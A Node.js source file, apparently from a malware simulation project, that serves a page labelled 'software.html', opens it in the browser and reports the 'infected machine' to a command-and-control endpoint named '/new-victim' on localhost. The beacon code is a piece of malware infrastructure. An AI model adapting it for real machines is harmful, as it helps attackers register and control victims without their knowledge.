const path = require("path");
const express = require("express");
const getPort = require("get-port");
const open = require("open");
const app = express();
var http = require("http");
const server = http.createServer(app);
const io = require("socket.io")(server);
const axios = require('axios');


//Notify command and control of the infected machine
const connectToCAndC = (host) => {
    // send compromised machine address to command and control
    axios.post("http://127.0.0.1:3001/new-victim", JSON.stringify({ host: host }), {
            headers: {
                'Content-Type': 'application/json'
            }
        })
        .then(res => {
            // console.log(res.code);
        })
        .catch(err => {
            console.error(err);
        });

};

(async function() {
    // find available port 3000 by default
    const port = await getPort({ port: 3000 });
    const host = `http://127.0.0.1:${port}`;

    //Setup server
    app.use("/resources", express.static(path.join(__dirname, "/")));
    app.get("/", function(req, res) {
        res.sendFile(path.join(__dirname + "/software.html"));
    });

    //Setup socket to update site with commands being run
    io.on("connection", (socket) => {
        console.log("connection established");
    });



    // start the server
    server.listen(port, async() => {
        await open(`${host}`);
        console.log(`Running on port ${port}`);
        //connect to command and control
        connectToCAndC(host);
    });


})();